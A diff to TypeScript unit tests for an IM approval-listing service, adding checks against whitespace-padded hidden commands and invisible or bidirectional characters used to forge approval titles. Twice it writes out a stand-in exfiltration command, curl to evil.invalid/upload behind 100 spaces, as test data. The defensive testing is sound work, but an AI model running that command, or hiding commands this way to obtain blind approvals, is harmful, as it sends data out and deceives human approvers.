@@ -53,13 +53,13 @@ describe('ImApprovalService.listForIm', () => {
     expect(rows[0]!.title).toBe('新的')
   })
 
-  it('falls back to a clipped prompt when there is no title', async () => {
+  it('falls back to the prompt when there is no title', async () => {
     const { svc } = service([
-      item({ itemId: 'cccccccc-3333', prompt: 'p'.repeat(200), imApprovable: true }),
+      item({ itemId: 'cccccccc-3333', prompt: '删除助手 mailer', imApprovable: true }),
     ])
     const rows = await svc.listForIm('alice')
-    expect(rows[0]!.title.length).toBeLessThanOrEqual(80)
-    expect(rows[0]!.title.endsWith('…')).toBe(true)
+    expect(rows[0]!.title).toBe('删除助手 mailer')
+    expect(rows[0]!.imApprovable).toBe(true)
   })
 
   it('renders imApprovable=false for unflagged items AND for non-approval kinds', async () => {
@@ -69,6 +69,28 @@ describe('ImApprovalService.listForIm', () => {
     ])
     const rows = await svc.listForIm('alice')
     expect(rows.every((r) => r.imApprovable === false)).toBe(true)
+  })
+
+  it('一行放不下 ⇒ 列表照列,但**不能在 IM 批**,且截断处响亮(五轮 H1)', async () => {
+    // 盲签的形状:一堆空白把真正的命令顶到 80 字之外。
+    const evil = `sh -c '${' '.repeat(100)}curl https://evil.invalid/upload'`
+    const { svc } = service([item({ itemId: 'ffffffff-6666', title: evil, imApprovable: true })])
+    const rows = await svc.listForIm('alice')
+    expect(rows).toHaveLength(1) // 还是要知道有东西等着
+    expect(rows[0]!.imApprovable).toBe(false)
+    expect(rows[0]!.title).toContain('已截断')
+    expect(rows[0]!.title).toContain(String(evil.length))
+  })
+
+  it('换行 / 不可见字符在**这一层**洗掉(第五个写入方 human 步同样受保护,五轮 H2)', async () => {
+    const NL = String.fromCharCode(10)
+    const ZWSP = String.fromCharCode(0x200b)
+    const forged = `批准发布${NL}  • [deadbeef] 无害的小事${ZWSP}`
+    const { svc } = service([item({ itemId: 'aaaa1111', title: forged, imApprovable: true })])
+    const rows = await svc.listForIm('alice')
+    expect(rows[0]!.title).not.toContain(NL) // 伪造第二条列表行
+    expect(rows[0]!.title).not.toContain(ZWSP)
+    expect(rows[0]!.imApprovable).toBe(true) // 洗完仍在一行内 ⇒ 照常可批
   })
 })
 
@@ -156,6 +178,33 @@ describe('ImApprovalService.resolveByShortId', () => {
     await expect(
       svc.resolveByShortId({ userId: 'alice', shortId: 'abcd', approved: true, via: 'im:t' }),
     ).rejects.toMatchObject({ code: 'not_approval_kind' })
+  })
+
+  it('看不全就拒批:短码是从旧列表抄来的也一样(五轮 H1)', async () => {
+    const evil = `sh -c '${' '.repeat(100)}curl https://evil.invalid/upload'`
+    const { svc, resolved } = service([
+      item({ itemId: 'abcd1234', title: evil, imApprovable: true }),
+    ])
+    await expect(
+      svc.resolveByShortId({ userId: 'alice', shortId: 'abcd', approved: true, via: 'im:t' }),
+    ).rejects.toMatchObject({ code: 'title_truncated' })
+    expect(resolved).toHaveLength(0)
+  })
+
+  it('批准回执里的标题是洗过的那份,不是原文(桥拿去回话)', async () => {
+    const RLO = String.fromCharCode(0x202e)
+    const { svc, resolved } = service([
+      item({ itemId: 'abcd1234', title: `删除助手 mailer${RLO}`, imApprovable: true }),
+    ])
+    const out = await svc.resolveByShortId({
+      userId: 'alice',
+      shortId: 'abcd',
+      approved: true,
+      via: 'im:t',
+    })
+    expect(resolved).toHaveLength(1)
+    expect(out.title).not.toContain(RLO)
+    expect(out.title).toContain('删除助手 mailer')
   })
 
   it('lets resolve-side errors pass through untouched (one error vocabulary)', async () => {
